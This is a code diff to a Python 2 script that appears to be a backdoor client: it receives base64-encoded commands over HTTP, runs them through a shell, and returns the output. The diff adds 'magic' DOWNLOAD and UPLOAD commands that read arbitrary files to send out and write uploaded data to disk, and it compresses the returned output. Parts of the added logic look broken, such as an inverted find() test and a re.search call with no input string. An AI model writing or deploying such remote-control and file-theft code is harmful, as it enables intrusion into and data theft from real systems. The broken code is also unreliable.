@@ -27,9 +27,11 @@
 
 import httplib
 import sys
+import re
 import random
 import base64
 import subprocess
+import bz2
 import time
 
 BLOCK_SIZE = 32
@@ -38,6 +40,7 @@ CONT_CONNECTION_STRING = "227061cd8c2a4d8af7ab2132f203453a"
 FINI_CONNECTION_STRING = "143061cdac2a4d8ff7ad213432cd413a"
 
 DEFAULT_PORT = 80
+MAGIC_CMD_STRING = "M4G1C"
 
 # keeping adding to this list, consider making this a list of tuples
 #  that contain both the Accept/Content-Type to pair with the file type
@@ -86,8 +89,20 @@ if(__name__ == "__main__"):
             cmd += chunk
         cmd = base64.b64decode(cmd)
         print "Recvd cmd: " + cmd
-        p=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output = p.stdout.read() + p.stderr.read()
+        if(cmd.find(MAGIC_CMD_STRING) == 0):
+            if(cmd[len(MAGIC_CMD_STRING):].find("DOWNLOAD")):
+                filename=cmd[len(MAGIC_CMD_STRING)+len("DOWNLOAD "):]
+                output=open(filename).read()
+            elif(cmd[len(MAGIC_CMD_STRING):].find("UPLOAD") == 0):
+                m=re.search(MAGIC_CMD_STRING+"UPLOAD (.+)" + MAGIC_CMD_STRING + "$")
+                to_write = m.group(0)
+                print to_write
+                open("hole_ul").write(to_write)
+                output = "File uploaded successfully as 'hole_ul'. *Gulp*"
+        else:
+            p=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = p.stdout.read() + p.stderr.read()
+        output = bz2.compress(output) # default compression level 9
         output = base64.b64encode(output)
         send_blocks = []
         i=0
